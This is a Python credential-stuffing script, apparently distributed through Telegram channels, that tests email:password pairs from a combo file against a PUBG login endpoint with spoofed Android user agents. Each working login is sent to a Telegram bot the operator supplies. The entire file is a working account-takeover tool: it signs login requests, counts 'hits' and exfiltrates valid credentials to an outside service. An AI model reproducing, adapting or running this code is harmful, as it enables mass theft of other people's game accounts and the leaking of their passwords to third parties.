import os
import datetime
class ModulDenetleme:
    def indir(self, modul):
        os.system(f"pip install {modul}")
        os.system("clear")

    def kontrol(self, modul):
        try:
            __import__(modul)
        except ImportError:
            self.indir(modul)

    def __init__(self):
        gerekli_moduller = ["requests","hashlib", "random", "string","time"]
        for gerekli_modul in gerekli_moduller:
            self.kontrol(gerekli_modul)
ModulDenetleme()
import requests 
import hashlib
import random
import string
import time
Y = "\033[1;32m"
K = "\033[1;31m"
S = "\033[1;33m"
M = "\033[1;35m"
logo = "𝑾𝑶𝑹𝑫𝑬𝑿 𝑷𝑼𝑩𝑮 𝑪𝑯𝑬𝑪𝑲𝑬𝑹\n\n\n\033[1;35m"+__import__("pyfiglet").Figlet("banner").renderText("PUBG")+"\033[00m\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
print(logo)
print(f"        {M}   TELEGRAM : @WOR1DEX @ANGEL_ARSİV\033[00m\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n")
token = input(f"{S} 1 {M}|{Y} 𝑻𝑶𝑲𝑬𝑵 𝑮𝑰𝑹 : {M}  ")
print(f"{K}──────────────")
ID = input(f"{S} 2 {M}|{Y} 𝑰𝑫 𝑮𝑰𝑹 : {M}  ")
print(f"{K}──────────────")
def ana_menü():
    dosya_yolu = input(f"{S} 3 {M}|{Y} 𝑫𝑶𝑺𝒀𝑨 𝒀𝑶𝑳𝑼 𝑮𝑰𝑹 : {M}  ")
    print(f"{K}──────────────")
    os.system("clear")
    print(logo)
    print(f"        {M}   TELEGRAM : @WOR1DEX @ANGEL_ARSİV\033[00m\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n")
    try:
     for x in open(dosya_yolu,"r").read().splitlines():
        e = x.split(":")[0]
        s = x.split(":")[1]
        denetle(e,s)
    except FileNotFoundError:exit(f"{K} ! {M}|{K} 𝑯𝑨𝑻𝑨𝑳𝑰 𝑫𝑶𝑺𝒀𝑨 𝒀𝑶𝑳𝑼 : {M} {dosya_yolu} ")
    except Exception as ex:exit(f"{K} ! {M}|{K} 𝑯𝑨𝑻𝑨 : {M} {ex} ")
user_agentler = [
    'Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv',
    'Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817',
    'Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv',
    'Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv',
    'Linux; Android 9; SM-G973U Build/PPR1.180610.011',
    'Linux; Android 8.0.0; SM-G960F Build/R16NW',
    'Linux; Android 7.0; SM-G892A Build/NRD90M; wv',
    'Linux; Android 7.0; SM-G930VC Build/NRD90M; wv',
    'Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv',
    'Linux; Android 6.0.1; SM-G920V Build/MMB29K',
    'Linux; Android 5.1.1; SM-G928X Build/LMY47X']
session = requests.session()
rastgele_user_agent = random.choice(user_agentler)
headers = {
    'Content-Length': '126',
    'Accept-Encoding': 'gzip',
    'Connection': 'Keep-Alive',
    'Host': 'igame.msdkpass.com',
    'User-Agent': 'Dalvik/2.1.0 '+rastgele_user_agent,
    'Content-Type': 'application/json; charset=utf-8' }
hit = 0
bad = 0
def denetle(eposta, şifre):
    global hit,bad
    şifre = hashlib.md5(bytes(f'{şifre}', encoding='utf-8')).hexdigest()
    ilk_istek = hashlib.md5(bytes('/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{"account":"' + eposta + '","account_type":1,"area_code":"","extra_json":"","password":"' + şifre + '"}3ec8cd69d71b7922e2a17445840866b26d86e283', encoding='utf-8')).hexdigest()
    ilk_link = f'https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={ilk_istek}'
    veriler = '{"account":"' + eposta + '","account_type":1,"area_code":"","extra_json":"","password":"' + şifre + '"}'
    time.sleep(0.5)
    son_istek = session.get(url=ilk_link, data=veriler, headers=headers)
    if 'token' in son_istek.text.lower():
        hit += 1
        print(f"{S} {hit} {M}|{Y} 𝑯𝑰𝑻 𝑷𝑼𝑩𝑮 : {K}{eposta}{S}:{K}{şifre} ✅  ")
        session.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𝑯𝑰𝑻 𝑷𝑼𝑩𝑮 : {eposta}:{şifre} ✅  \n')
    else:
        bad += 1
        print(f"{S} {bad} {M}|{Y} 𝑩𝑨𝑫 𝑷𝑼𝑩𝑮 : {K}{eposta}{S}:{K}{şifre} ❌  ")    
ana_menü()